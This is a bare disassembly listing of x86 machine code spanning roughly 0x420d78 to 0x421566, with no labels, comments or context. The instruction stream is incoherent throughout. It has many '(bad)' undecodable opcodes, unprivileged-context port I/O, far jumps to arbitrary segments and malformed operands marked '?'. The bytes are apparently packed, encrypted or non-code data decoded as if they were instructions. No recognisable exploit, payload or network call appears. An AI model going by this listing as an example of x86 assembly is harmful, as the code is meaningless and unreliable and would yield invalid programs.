  420d78:	mov    bx,0x8d1f
  420d7c:	xchg   edx,eax
  420d7d:	mov    ds:0x9c001ddf,eax
  420d82:	(bad)  
  420d83:	jno    0x420d44
  420d85:	push   cs
  420d86:	ss sbb eax,0x33930901
  420d8c:	push   ecx
  420d8d:	cmp    eax,0xfa1c74dd
  420d92:	js     0x420d87
  420d94:	lods   eax,DWORD PTR ds:[esi]
  420d95:	jnp    0x420d4b
  420d97:	or     eax,0xf928dbe
  420d9c:	jmp    0x31e9e3ac
  420da1:	xor    eax,0xf822f9f7
  420da6:	push   edi
  420da7:	mov    bh,0x4d
  420da9:	pop    ds
  420daa:	rcl    ebx,1
  420dac:	xchg   DWORD PTR [edi*1-0x5514914f],edx
  420db3:	xchg   edx,eax
  420db4:	in     eax,dx
  420db5:	push   eax
  420db6:	sub    bl,0xd8
  420db9:	mov    ecx,0x9a38af92
  420dbe:	out    dx,eax
  420dbf:	inc    edx
  420dc0:	cs mov ebx,0x869c6101
  420dc6:	js     0x420df2
  420dc8:	fcmove st,st(4)
  420dca:	cmc    
  420dcb:	mov    al,0x14
  420dcd:	pop    esp
  420dce:	and    eax,0xe4199d14
  420dd3:	mov    ebx,DWORD PTR [edx]
  420dd5:	cmp    al,bh
  420dd7:	lods   al,BYTE PTR ds:[esi]
  420dd8:	shl    DWORD PTR [ecx+ebx*1+0x2a],cl
  420ddc:	and    esi,DWORD PTR ds:0x2f907bca
  420de2:	bnd jno 0x420e34
  420de5:	and    edi,ebp
  420de7:	jns    0x420e1c
  420de9:	add    DWORD PTR [ecx+0x2a1be365],edx
  420def:	mov    dh,0x55
  420df1:	test   BYTE PTR [ecx-0x3505082d],ch
  420df7:	sbb    eax,DWORD PTR [edi+eiz*1+0x29ca913c]
  420dfe:	mov    cl,0xd0
  420e00:	sbb    ah,dl
  420e02:	mov    DWORD PTR [ebp+eax*2-0x15],ecx
  420e06:	iret   
  420e07:	aam    0xca
  420e09:	mov    al,ds:0xda279158
  420e0e:	jne    0x420dc6
  420e10:	cdq    
  420e11:	add    bl,BYTE PTR [ecx+0x24]
  420e14:	in     eax,dx
  420e15:	(bad)  
  420e16:	(bad)  
  420e17:	in     eax,dx
  420e18:	xor    al,0x8
  420e1a:	and    BYTE PTR [ebx+0x4a],bh
  420e1d:	dec    esi
  420e1e:	pop    ecx
  420e1f:	jle    0x420e22
  420e21:	ds ins DWORD PTR es:[edi],dx
  420e23:	pop    edi
  420e24:	push   ebp
  420e25:	(bad)  
  420e26:	jnp    0x420e01
  420e28:	daa    
  420e29:	adc    al,0x16
  420e2b:	push   ebx
  420e2c:	int3   
  420e2d:	aam    0x9d
  420e2f:	and    eax,0xe1e9d623
  420e34:	mov    ch,0x2a
  420e36:	dec    edx
  420e37:	xor    al,0x34
  420e39:	push   es
  420e3a:	pop    edx
  420e3b:	inc    esp
  420e3c:	mov    gs,WORD PTR [ecx-0x67]
  420e3f:	outs   dx,DWORD PTR ds:[esi]
  420e40:	dec    ebp
  420e41:	dec    ecx
  420e42:	ss stos BYTE PTR es:[edi],al
  420e44:	arpl   dx,sp
  420e46:	les    ebx,FWORD PTR [ebp+0x2e1ea6d4]
  420e4c:	sbb    BYTE PTR ds:0x987f2088,ch
  420e52:	add    BYTE PTR [esi],bl
  420e54:	xlat   BYTE PTR ds:[ebx]
  420e55:	inc    esp
  420e56:	out    0x62,al
  420e58:	inc    ecx
  420e59:	push   cs
  420e5a:	in     eax,dx
  420e5b:	pusha  
  420e5c:	fidivr WORD PTR [ebx-0x6c950bc8]
  420e62:	nop
  420e63:	lock ja 0x420e87
  420e66:	xchg   DWORD PTR [ecx],edi
  420e68:	push   edx
  420e69:	pop    ebp
  420e6a:	es popa 
  420e6c:	dec    esp
  420e6d:	std    
  420e6e:	mov    esi,0xd000161c
  420e73:	sbb    al,0xe3
  420e75:	and    ch,cl
  420e77:	call   0x301c0321
  420e7c:	or     ebp,DWORD PTR [ecx+edi*4-0x8637b31]
  420e83:	fidiv  DWORD PTR [edi]
  420e85:	out    dx,eax
  420e86:	push   esi
  420e87:	shl    DWORD PTR [edi],0x4a
  420e8a:	pop    ecx
  420e8b:	retf   
  420e8c:	(bad)  
  420e8d:	in     eax,0x5f
  420e8f:	ja     0x420e4b
  420e91:	cli    
  420e92:	cmp    eax,0x4a9e7630
  420e97:	cmc    
  420e98:	mov    cl,0x66
  420e9a:	or     eax,0xbd683b67
  420e9f:	les    ecx,FWORD PTR [ecx-0x30]
  420ea2:	ds inc edx
  420ea4:	outs   dx,DWORD PTR ds:[esi]
  420ea5:	aas    
  420ea6:	sahf   
  420ea7:	xchg   ebx,eax
  420ea8:	ffree  st(0)
  420eaa:	push   esp
  420eab:	fimul  DWORD PTR ds:0x26b76dee
  420eb1:	or     al,0xf7
  420eb3:	jns    0x420ef3
  420eb5:	psubusw mm2,mm0
  420eb8:	mov    eax,0x14fb780e
  420ebd:	lods   eax,DWORD PTR ds:[esi]
  420ebe:	je     0x420ee6
  420ec0:	(bad)  
  420ec2:	bsr    edi,DWORD PTR [ebx+0x1f6607c7]
  420ec9:	les    edi,FWORD PTR [ebx+0x9f28345]
  420ecf:	mov    dh,al
  420ed1:	xchg   edi,eax
  420ed2:	push   ebx
  420ed3:	(bad)  [ebx+0x2f]
  420ed6:	ja     0x420e70
  420ed8:	daa    
  420ed9:	adc    eax,0xfda3b4e
  420ede:	xchg   DWORD PTR [eax],ecx
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	add    BYTE PTR [ebx-0x25162fab],cl
  420ee8:	sbb    DWORD PTR [eax],eax
  420eea:	add    BYTE PTR [ebx+0xde9c855],cl
  420ef0:	add    eax,0xc7c90000
  420ef5:	ror    bl,0xca
  420ef8:	retf   
  420ef9:	leave  
  420efa:	lds    esp,FWORD PTR [edi+0x5572f76f]
  420f00:	outs   dx,DWORD PTR ds:[esi]
  420f01:	fisubr DWORD PTR [esi+0x787f670b]
  420f07:	jae    0x420f85
  420f09:	js     0x420f83
  420f0b:	dec    esi
  420f0c:	push   eax
  420f0d:	xchg   ebp,eax
  420f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f0f:	xchg   edi,eax
  420f10:	fbld   TBYTE PTR [edi-0x7a42b12d]
  420f16:	adc    eax,0x6006022
  420f1b:	sbb    eax,0x25464a3f
  420f20:	cdq    
  420f21:	pop    esp
  420f22:	sbb    BYTE PTR [esi],ch
  420f24:	mov    ah,0x5e
  420f26:	ds xchg ebx,eax
  420f28:	bnd jae 0x420eda
  420f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f2c:	inc    esp
  420f2d:	xchg   ecx,eax
  420f2e:	jnp    0x420f66
  420f30:	sbb    edx,DWORD PTR [edi+0x68ca6815]
  420f36:	and    bl,BYTE PTR [edi+0x5d]
  420f39:	and    DWORD PTR [ebx+esi*8],edx
  420f3c:	popa   
  420f3d:	sub    BYTE PTR [ecx-0x1278a7c5],ah
  420f43:	push   esp
  420f44:	out    dx,al
  420f45:	sub    eax,0x4a9461d
  420f4a:	sub    al,0xf9
  420f4c:	leave  
  420f4d:	bound  edx,QWORD PTR [ebp+0x6f4086c]
  420f53:	pop    eax
  420f54:	rcl    DWORD PTR [ecx-0x46],0x1
  420f58:	mov    dl,0x55
  420f5a:	pop    ds
  420f5b:	and    bh,ch
  420f5d:	pop    ebp
  420f5e:	(bad)  
  420f5f:	repnz shl DWORD PTR [esp+ebp*4],0x47
  420f64:	mov    eax,ds:0x7a19d3b5
  420f69:	data16 data16 scas al,BYTE PTR es:[edi]
  420f6c:	int    0xfc
  420f6e:	dec    ebx
  420f6f:	scas   al,BYTE PTR es:[edi]
  420f70:	rcl    cl,cl
  420f72:	stos   BYTE PTR es:[edi],al
  420f73:	or     dh,BYTE PTR [esi-0x57f0acfc]
  420f79:	fst    DWORD PTR [ecx]
  420f7b:	xor    al,0x90
  420f7d:	xchg   esi,eax
  420f7e:	and    cl,BYTE PTR [edi+eiz*4+0x2b0e0936]
  420f85:	fldenv [edi+edi*1+0x2f0fd49f]
  420f8c:	iret   
  420f8d:	add    bl,BYTE PTR [ecx+edx*4-0x5f]
  420f91:	push   eax
  420f92:	mov    dl,0xc1
  420f94:	sbb    esi,DWORD PTR [esi+esi*4]
  420f97:	lock xchg ecx,eax
  420f99:	jmp    0x420fee
  420f9b:	ds push edx
  420f9d:	(bad)  
  420f9e:	loope  0x420ff4
  420fa0:	gs push edx
  420fa2:	cmp    al,0x37
  420fa4:	or     BYTE PTR [edi+0x134fa631],al
  420faa:	bound  ebx,QWORD PTR [esi+esi*2+0x3a223a2e]
  420fb1:	push   0x46
  420fb3:	(bad)  
  420fb4:	neg    BYTE PTR [edx]
  420fb6:	add    BYTE PTR [ecx+0x6409a5b4],0x16
  420fbd:	push   0x42
  420fbf:	adc    al,dh
  420fc1:	adc    DWORD PTR [esi-0x2d],0x5d1bb7bf
  420fc8:	jp     0x420fc4
  420fca:	(bad)  
  420fcb:	imul   ebp,esp,0x25
  420fce:	scas   eax,DWORD PTR es:[edi]
  420fcf:	hlt    
  420fd0:	ja     0x420fc8
  420fd2:	ja     0x420fbc
  420fd4:	jmp    0xa89c:0x5e2bea95
  420fdb:	xor    al,0x21
  420fdd:	shr    DWORD PTR [edi],0x2
  420fe0:	rcr    DWORD PTR [edx+0xa],0x5
  420fe4:	inc    esp
  420fe5:	mov    gs:0xfa910f91,eax
  420feb:	jmp    0xb2ea:0x74101355
  420ff2:	cmp    esi,DWORD PTR [edi-0x47]
  420ff5:	mov    al,ds:0x5c2967fb
  420ffa:	dec    ebp
  420ffb:	or     bh,ah
  420ffd:	push   ecx
  420ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fff:	loopne 0x420ff9
  421001:	in     al,dx
  421002:	push   esi
  421003:	test   eax,0x9096844a
  421008:	imul   ebp,DWORD PTR [ebx-0x1ecf7def],0x31a33352
  421012:	add    al,0x1d
  421014:	or     al,0x6f
  421016:	(bad)  
  421017:	pop    eax
  421018:	mov    ebp,esp
  42101a:	lods   al,BYTE PTR ds:[esi]
  42101b:	push   eax
  42101c:	pop    ebx
  42101d:	xor    dh,BYTE PTR [ebp+0x5d]
  421020:	mov    DWORD PTR [eax+0x141aeff6],edx
  421026:	push   ebx
  421027:	xchg   edi,eax
  421028:	gs icebp 
  42102a:	outs   dx,BYTE PTR ds:[esi]
  42102b:	dec    ecx
  42102c:	in     al,0xd7
  42102e:	pop    fs
  421030:	test   BYTE PTR [ebx],ch
  421032:	stc    
  421033:	gs jae 0x42103f
  421036:	imul   esp,DWORD PTR [esi-0x15fa85aa],0xffffffc8
  42103d:	push   cs
  42103e:	icebp  
  42103f:	addr16 ret 
  421041:	stc    
  421042:	fs xchg DWORD PTR cs:[edx],ebx
  421046:	xor    al,0x52
  421048:	fiadd  DWORD PTR [edi]
  42104a:	daa    
  42104b:	sub    edx,esi
  42104d:	fwait
  42104e:	mov    esp,DWORD PTR [edx+0x4b1a21cb]
  421054:	add    DWORD PTR [edx-0x1b],esi
  421057:	add    edi,DWORD PTR [esi]
  421059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42105a:	sbb    eax,0xd9b7df58
  42105f:	retf   
  421060:	and    bl,bl
  421062:	mov    BYTE PTR ds:[ebx],al
  421065:	not    dh
  421067:	xchg   edi,eax
  421068:	pop    ecx
  421069:	sbb    eax,DWORD PTR ss:[edi+0x644d64db]
  421070:	pop    esi
  421071:	jmp    0x7c67:0xa55d4e1
  421078:	stc    
  421079:	dec    edi
  42107a:	es push ebx
  42107c:	(bad)  
  42107e:	mov    bl,0x8d
  421080:	fnclex 
  421082:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  421084:	or     eax,0x13692a6e
  421089:	mov    bh,0xca
  42108b:	imul   esi,DWORD PTR [esi-0x40c07209],0xffffffd8
  421092:	adc    DWORD PTR [esi+0x2f7e989],edi
  421098:	mov    ebp,0x15e4c6ee
  42109d:	ins    BYTE PTR es:[edi],dx
  42109e:	imul   esi,DWORD PTR [edi+0x5126565a],0x34
  4210a5:	xchg   DWORD PTR [edi+0x2da77a6d],ebx
  4210ab:	adc    ecx,ebx
  4210ad:	mov    ?,WORD PTR [eax+0x73]
  4210b0:	mov    esp,0x93b376ee
  4210b5:	scas   al,BYTE PTR es:[edi]
  4210b6:	addr16 pop es
  4210b8:	in     al,0xe3
  4210ba:	jns    0x421109
  4210bc:	xor    esp,ecx
  4210be:	fst    QWORD PTR [edx]
  4210c0:	xor    BYTE PTR [esi],al
  4210c2:	sbb    DWORD PTR [edx-0x56],ecx
  4210c5:	das    
  4210c6:	pop    ebx
  4210c7:	ja     0x4210e7
  4210c9:	mov    al,BYTE PTR [esi+0x7a]
  4210cc:	jnp    0x421074
  4210ce:	std    
  4210cf:	sbb    edx,edi
  4210d1:	test   al,0xdf
  4210d3:	loope  0x4210c2
  4210d5:	lea    edx,[ecx-0x104c1313]
  4210db:	in     al,dx
  4210dc:	mov    cl,BYTE PTR [ecx]
  4210de:	ds cmp al,0x2b
  4210e1:	adc    al,0x2d
  4210e3:	(bad)  
  4210e4:	cmc    
  4210e5:	dec    ebp
  4210e6:	inc    esp
  4210e7:	and    DWORD PTR [esi-0x7d207740],0x4d
  4210ee:	mov    bh,0xaa
  4210f0:	call   0xedf9:0xc3a972ee
  4210f7:	test   DWORD PTR [ebx+0x1d],0x9054602
  4210fe:	mov    ds:0x4140da71,eax
  421103:	icebp  
  421104:	jb     0x4210ee
  421106:	popa   
  421107:	bnd jle 0x4210e0
  42110a:	pop    esp
  42110b:	mov    esi,0xdd9eda53
  421110:	pushf  
  421111:	popa   
  421112:	rol    DWORD PTR [eax-0x24],cl
  421115:	xor    BYTE PTR [edi-0xa],0xa5
  421119:	mov    ebx,ecx
  42111b:	call   FWORD PTR [edx]
  42111d:	in     al,0xe4
  42111f:	aaa    
  421120:	mov    al,fs:0xbef48e3d
  421126:	xchg   ebp,eax
  421127:	xor    DWORD PTR [edi],ebx
  421129:	mov    ds:0x4fc4d37a,eax
  42112e:	xlat   BYTE PTR ds:[ebx]
  42112f:	and    eax,0xcc417f37
  421134:	ret    0x4eac
  421137:	sbb    ch,BYTE PTR [edi+0xcb7bea]
  42113d:	inc    ebx
  42113e:	xor    ebx,eax
  421140:	mov    ebx,0xe900880d
  421145:	bound  edx,QWORD PTR [edx-0x56c830ff]
  42114b:	shr    al,1
  42114d:	mov    eax,ds:0x11f343a4
  421152:	rol    BYTE PTR [ebx-0x5844f663],cl
  421158:	xor    eax,0x2bcff47d
  42115d:	rcr    DWORD PTR [ecx],cl
  42115f:	int    0xc
  421161:	push   ecx
  421162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421163:	sub    DWORD PTR [edx-0x5bfb2b11],esp
  421169:	push   ebp
  42116a:	or     BYTE PTR [edx-0x34],0x17
  42116e:	sbb    DWORD PTR es:[edi],edi
  421171:	push   0x22801a32
  421176:	pop    ebx
  421177:	inc    edi
  421178:	icebp  
  421179:	mov    DWORD PTR [esp+edx*1],ebp
  42117c:	sbb    ecx,DWORD PTR [edi+0x27040f1e]
  421182:	xor    al,0xfb
  421184:	ffreep st(4)
  421186:	jnp    0x42115d
  421188:	mov    esi,0x4eb8b542
  42118d:	jmp    0x4211cd
  42118f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421190:	stos   DWORD PTR es:[edi],eax
  421191:	cmp    esi,DWORD PTR [eax-0x4]
  421194:	cmp    BYTE PTR [ebx],ah
  421196:	adc    ch,al
  421198:	dec    esp
  421199:	mov    ebx,0x4535f0d7
  42119e:	dec    ebx
  42119f:	push   es
  4211a0:	and    al,0xa4
  4211a2:	mov    al,0xfb
  4211a4:	dec    ebp
  4211a5:	sbb    DWORD PTR [edx],0xfffffff7
  4211a8:	xchg   ecx,eax
  4211a9:	pop    ebx
  4211aa:	pop    ds
  4211ab:	cld    
  4211ac:	or     BYTE PTR [ecx-0x631e21f],ah
  4211b2:	(bad)  
  4211b3:	in     al,0xd2
  4211b5:	cld    
  4211b6:	mov    DWORD PTR [eax],ecx
  4211b8:	sbb    dh,BYTE PTR [ebx+0x72]
  4211bb:	in     eax,dx
  4211bc:	push   0xffffffdd
  4211be:	xchg   ebp,eax
  4211bf:	mov    ebx,0x2bd30457
  4211c4:	ja     0x421227
  4211c6:	shl    BYTE PTR [ebp-0x5a],cl
  4211c9:	and    edx,DWORD PTR [eax]
  4211cb:	inc    esp
  4211cc:	mov    al,ds:0xc6318915
  4211d1:	int    0xa2
  4211d3:	and    al,0xf5
  4211d5:	fisub  WORD PTR [ebp-0x12]
  4211d8:	pop    es
  4211d9:	xchg   esi,eax
  4211da:	sub    BYTE PTR ds:0x2ae22946,0x47
  4211e1:	xchg   ecx,eax
  4211e2:	sbb    al,0xa1
  4211e4:	arpl   WORD PTR [edi-0x41],dx
  4211e7:	jnp    0x421169
  4211e9:	mov    ds:0xcfcaa63f,al
  4211ee:	add    eax,0x853f5b5b
  4211f3:	or     BYTE PTR [eax-0x24aa6f3e],ah
  4211f9:	inc    edx
  4211fa:	nop
  4211fb:	(bad)  
  4211fc:	mov    al,ds:0x2b410041
  421201:	push   ebp
  421202:	rcl    ebp,cl
  421204:	mov    WORD PTR ds:0x29898ed,ds
  42120a:	test   esi,0x26193d5
  421210:	lock out 0x6b,eax
  421213:	sti    
  421214:	adc    bh,bh
  421216:	dec    ecx
  421217:	lea    edx,[edx]
  421219:	dec    ebp
  42121a:	lahf   
  42121b:	inc    esi
  42121c:	push   0xffffffb2
  42121e:	sbb    DWORD PTR [ecx+0x6de68798],esi
  421224:	mov    ah,0xa8
  421226:	test   BYTE PTR [ecx-0x23],bh
  421229:	mov    ebx,DWORD PTR [edi+0x6d8919be]
  42122f:	inc    ebx
  421230:	shl    cl,0xa8
  421233:	push   ebp
  421234:	pop    ecx
  421235:	js     0x421210
  421237:	pop    edi
  421238:	shl    DWORD PTR [esi+0x8e409be],0xda
  42123f:	mov    ds:0x62d41d0b,al
  421244:	les    edx,FWORD PTR [edi-0x1e3291ee]
  42124a:	adc    al,0x68
  42124c:	adc    edx,DWORD PTR [edi]
  42124e:	pop    ebx
  42124f:	pop    ebx
  421250:	loopne 0x421247
  421252:	in     eax,dx
  421253:	repnz aad 0xfe
  421256:	gs pop edx
  421258:	mov    edx,0xd828d19d
  42125d:	sbb    BYTE PTR [ebx-0xb],cl
  421260:	sub    al,0x73
  421262:	mov    ebx,0x6f04c7a9
  421267:	push   cs
  421268:	and    DWORD PTR [ecx],edx
  42126a:	xchg   DWORD PTR [ecx+0x6c14fd],eax
  421270:	fcmovb st,st(0)
  421272:	adc    DWORD PTR [ebp+0x778b67a8],ecx
  421278:	arpl   WORD PTR [esi-0xc],bx
  42127b:	sbb    BYTE PTR [edx+0x1bdee1b3],bl
  421281:	popa   
  421282:	lock jmp 0x4212f3
  421285:	jle    0x4212db
  421287:	scas   eax,DWORD PTR es:[edi]
  421288:	cs imul edi,ecx,0xb22133b9
  42128f:	ret    0x319b
  421292:	out    dx,al
  421293:	xor    eax,0x4705a20a
  421298:	add    BYTE PTR [esp+esi*8],dl
  42129b:	in     al,dx
  42129c:	push   es
  42129d:	aam    0xe3
  42129f:	stos   DWORD PTR es:[edi],eax
  4212a0:	daa    
  4212a1:	mov    ch,0xfd
  4212a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212a4:	cs mov al,0xcf
  4212a7:	or     DWORD PTR [esi],edi
  4212a9:	jmp    0x42123a
  4212ab:	inc    ebp
  4212ac:	outs   dx,DWORD PTR ds:[esi]
  4212ad:	dec    ebx
  4212ae:	mov    DWORD PTR [edx],0x3379189c
  4212b4:	sub    al,0xf6
  4212b6:	mov    esp,0xf501fe48
  4212bb:	lea    ebx,[esi*1-0x2b6cd3]
  4212c2:	sub    cl,BYTE PTR [esi-0x9]
  4212c5:	mov    WORD PTR [eax+0x7936d311],?
  4212cb:	test   BYTE PTR [ebp-0x68369aa0],cl
  4212d1:	cmc    
  4212d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212d3:	push   0x2d63d09f
  4212d8:	xchg   ebx,eax
  4212d9:	xor    edx,edx
  4212db:	(bad)  [ebp-0x3a1cde0a]
  4212e1:	loop   0x4212a7
  4212e3:	(bad)  
  4212e4:	pop    ss
  4212e5:	js     0x42132d
  4212e7:	pop    edx
  4212e8:	lods   al,BYTE PTR ds:[esi]
  4212e9:	xchg   DWORD PTR [eax-0x7e3f0656],edi
  4212ef:	add    BYTE PTR [eax],ah
  4212f1:	jmp    0x42133b
  4212f3:	mov    bh,BYTE PTR [ebx]
  4212f5:	ins    BYTE PTR es:[edi],dx
  4212f6:	inc    eax
  4212f7:	jne    0x421374
  4212f9:	jl     0x4212ab
  4212fb:	add    ebp,DWORD PTR [ecx-0x52]
  4212fe:	mov    ds:0x2c46f56d,al
  421303:	sub    eax,0x3b17914e
  421308:	retf   
  421309:	dec    bp
  42130b:	mov    ebx,0x8f0a8f4a
  421310:	cmp    eax,0x7c8186df
  421315:	sbb    DWORD PTR [ebp-0x60],ebp
  421318:	scas   eax,DWORD PTR es:[edi]
  421319:	xchg   edx,eax
  42131a:	pop    ecx
  42131b:	dec    ebx
  42131c:	jb     0x4212aa
  42131e:	dec    esi
  42131f:	out    dx,eax
  421320:	jo     0x421390
  421322:	fwait
  421323:	bound  ebp,QWORD PTR [esi]
  421325:	mov    dh,0xef
  421327:	cmp    BYTE PTR [ecx+0x7d81fc98],dh
  42132d:	ins    DWORD PTR es:[edi],dx
  42132e:	or     al,0xa1
  421330:	jg     0x42139c
  421332:	es es fwait
  421335:	push   eax
  421336:	mov    ah,0xea
  421338:	mov    BYTE PTR [esi-0x46],al
  42133b:	ficom  WORD PTR [edi]
  42133d:	jmp    0x4213bd
  42133f:	mov    cl,0xc8
  421341:	shl    DWORD PTR [eax+0x3f72d8cf],1
  421347:	push   esi
  421348:	mov    edi,0x15feed8f
  42134e:	imul   eax
  421350:	inc    ebp
  421351:	sbb    esi,DWORD PTR [edi]
  421353:	in     eax,0x32
  421355:	cmp    eax,0x2944b46f
  42135a:	sahf   
  42135b:	std    
  42135c:	sub    BYTE PTR [ebx+0x65ae3c34],bl
  421362:	xchg   esi,eax
  421363:	fstp   QWORD PTR [eax]
  421365:	jp     0x421304
  421367:	fbld   TBYTE PTR [esi-0x7d72ecde]
  42136d:	push   edi
  42136e:	add    DWORD PTR [ecx],eax
  421370:	mov    dl,0xd8
  421372:	dec    edi
  421373:	push   0xbace8951
  421378:	xchg   ebx,eax
  421379:	outs   dx,BYTE PTR ds:[esi]
  42137a:	jns    0x4213ca
  42137c:	pop    ds
  42137d:	mov    esi,0xb192140b
  421382:	scas   al,BYTE PTR es:[edi]
  421383:	push   eax
  421384:	arpl   WORD PTR [ebx-0x3c],bp
  421387:	or     eax,0xabdad3f7
  42138c:	out    0xf3,eax
  42138e:	adc    BYTE PTR [edx-0x46],bl
  421391:	scas   eax,DWORD PTR es:[edi]
  421392:	mov    al,ds:0x407a2c8b
  421397:	fwait
  421398:	mov    ds:0xd6a6249f,eax
  42139d:	cdq    
  42139e:	xchg   esp,eax
  42139f:	fsub   DWORD PTR [edi+ebp*4+0x24f5a0aa]
  4213a6:	in     eax,0xb2
  4213a8:	fs push ebx
  4213aa:	sti    
  4213ab:	pop    edx
  4213ac:	dec    ebx
  4213ad:	pop    ss
  4213ae:	mov    cl,0xc8
  4213b0:	mov    al,ds:0x3b404497
  4213b5:	xor    al,0x79
  4213b7:	add    eax,0x1d50fca9
  4213bc:	test   al,dl
  4213be:	push   esp
  4213bf:	loopne 0x42143d
  4213c1:	push   esp
  4213c2:	adc    ch,BYTE PTR [ebx+0x68]
  4213c5:	xlat   BYTE PTR ds:[ebx]
  4213c6:	push   eax
  4213c7:	call   0x71cc:0xbcc37576
  4213ce:	mov    cl,0x4e
  4213d0:	addr16 dec eax
  4213d2:	int    0xda
  4213d4:	ja     0x42136b
  4213d6:	shl    BYTE PTR [edi-0x17],0x85
  4213da:	jne    0x4213fc
  4213dc:	pusha  
  4213dd:	mov    cl,0xcc
  4213df:	and    BYTE PTR [edi+edx*1],al
  4213e2:	shl    DWORD PTR [esi+0x6db97b52],0xa1
  4213e9:	repnz lds ecx,FWORD PTR [ecx+eiz*8+0x78]
  4213ee:	sub    cl,BYTE PTR [edi+0x2d]
  4213f1:	mov    eax,ss
  4213f3:	jecxz  0x4213d0
  4213f5:	rcr    BYTE PTR [ebx-0x2bce2fd0],cl
  4213fb:	and    ebx,DWORD PTR [ebx-0x3a]
  4213fe:	loopne 0x421422
  421400:	mov    edi,DWORD PTR [ebp-0x4]
  421403:	xor    edx,eax
  421405:	jmp    0x421917
  42140a:	rcl    edx,1
  42140c:	(bad)  
  42140d:	leave  
  42140e:	aad    0xc9
  421410:	rcr    edx,1
  421412:	or     eax,0x69072fb9
  421417:	adc    ebx,0x5f
  42141a:	jle    0x421486
  42141c:	jg     0x421496
  42141e:	jae    0x42149c
  421420:	js     0x42149a
  421422:	repnz ds inc eax
  421425:	test   ebp,eax
  421427:	sub    edi,eax
  421429:	sub    BYTE PTR [eax+0x1e],ah
  42142c:	or     bh,ch
  42142e:	das    
  42142f:	inc    ebp
  421430:	into   
  421431:	xchg   DWORD PTR [ecx-0x472587a9],ecx
  421437:	pop    ds
  421438:	sub    ebx,DWORD PTR gs:[edi+0x40]
  42143c:	sbb    al,0x99
  42143e:	mov    dl,0x4a
  421440:	xor    dh,al
  421442:	and    bl,BYTE PTR [edi+0x79f42e03]
  421448:	push   esi
  421449:	pop    ds
  42144a:	dec    edi
  42144b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42144c:	test   BYTE PTR [esi-0x1260accc],dh
  421452:	push   ebx
  421453:	mov    ah,0xdd
  421455:	in     eax,dx
  421456:	inc    ebx
  421457:	(bad)
  42145b:	pop    ds
  42145c:	imul   esp,ecx,0xbaa36550
  421462:	loop   0x421476
  421464:	pop    es
  421465:	fisttp DWORD PTR [ebx-0x21]
  421468:	out    0x56,al
  42146a:	push   ebp
  42146b:	cmp    BYTE PTR [ebx+0xd81539b],bl
  421471:	add    al,0xe6
  421473:	aad    0x3c
  421475:	xchg   edx,eax
  421476:	test   eax,0xc2f13411
  42147b:	push   ebp
  42147c:	dec    esi
  42147d:	mov    al,dl
  42147f:	enter  0x4696,0xd4
  421483:	pop    esp
  421484:	fcomp  DWORD PTR [esi-0x36d694c3]
  42148a:	mov    eax,ds:0x1743db36
  42148f:	call   0x7fa2:0xa2330771
  421496:	gs data16 into 
  421499:	stc    
  42149a:	aam    0xbe
  42149c:	cmp    al,0x41
  42149e:	pop    ds
  42149f:	into   
  4214a0:	or     al,0x14
  4214a2:	add    DWORD PTR [edx-0x17f18563],edi
  4214a8:	iret   
  4214a9:	xor    eax,0x874d63fa
  4214ae:	mov    esi,0xf90c98a1
  4214b3:	push   0xffffffb0
  4214b5:	xor    esi,ebp
  4214b7:	adc    DWORD PTR [edi+ebx*4+0x6f],eax
  4214bb:	sti    
  4214bc:	ret    0xa9b5
  4214bf:	pop    ecx
  4214c0:	push   edi
  4214c1:	push   esp
  4214c2:	jno    0x42152a
  4214c4:	pushf  
  4214c5:	and    BYTE PTR [ebx+0x18],dl
  4214c8:	adc    BYTE PTR [ebp+0x9f66a86],dh
  4214ce:	test   DWORD PTR [ebx],edx
  4214d0:	mov    bh,0x80
  4214d2:	mov    ds:0xcf7ab48b,eax
  4214d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214d8:	adc    BYTE PTR [esi-0x13],ah
  4214db:	sbb    esi,edx
  4214dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214de:	pop    ds
  4214df:	div    BYTE PTR [ebx-0x78]
  4214e2:	mov    edi,0xcac3b473
  4214e7:	outs   dx,DWORD PTR ds:[esi]
  4214e8:	adc    DWORD PTR [edi+0xb94fee7],esp
  4214ee:	ins    DWORD PTR es:[edi],dx
  4214ef:	(bad)  
  4214f0:	mov    dh,0xe6
  4214f2:	push   edi
  4214f3:	cdq    
  4214f4:	xchg   esi,eax
  4214f5:	pop    ebp
  4214f6:	dec    ebp
  4214f7:	hlt    
  4214f8:	mov    esp,0x4cd3dc67
  4214fd:	fimul  WORD PTR [ecx]
  4214ff:	ja     0x4214f9
  421501:	(bad)  
  421503:	inc    edi
  421504:	popf   
  421505:	loope  0x4214a8
  421507:	shr    DWORD PTR [ebp+0x741e9dfc],1
  42150d:	aas    
  42150e:	xchg   ebx,eax
  42150f:	mov    eax,cs:0x55c0bc62
  421515:	push   0x8
  421517:	out    0x7f,al
  421519:	dec    esi
  42151a:	sbb    dh,BYTE PTR [esi-0x4]
  42151d:	js     0x4214a7
  42151f:	inc    esp
  421520:	push   0x168c1224
  421525:	pop    ss
  421526:	mov    ebx,0x5ba0cb1b
  42152b:	mov    ds:0x874d35fe,eax
  421530:	aaa    
  421531:	jo     0x421553
  421533:	fs scas al,BYTE PTR es:[edi]
  421535:	jbe    0x421512
  421537:	(bad)  
  421538:	popf   
  421539:	ins    BYTE PTR es:[edi],dx
  42153a:	mov    ecx,0x39fa8c5d
  42153f:	out    dx,eax
  421540:	call   0x9fae:0xe42c9ca9
  421547:	inc    esp
  421548:	pop    ecx
  421549:	dec    ecx
  42154a:	cdq    
  42154b:	xor    BYTE PTR [esi-0x6a],ch
  42154e:	imul   esi,DWORD PTR [edi],0xae270e44
  421554:	sbb    ebp,DWORD PTR [eax]
  421556:	and    DWORD PTR ds:0x2fbd4b28,edi
  42155c:	loope  0x4215c7
  42155e:	test   esp,0xb6d158c8
  421564:	ja     0x42152f
  421566:	je     0x421506
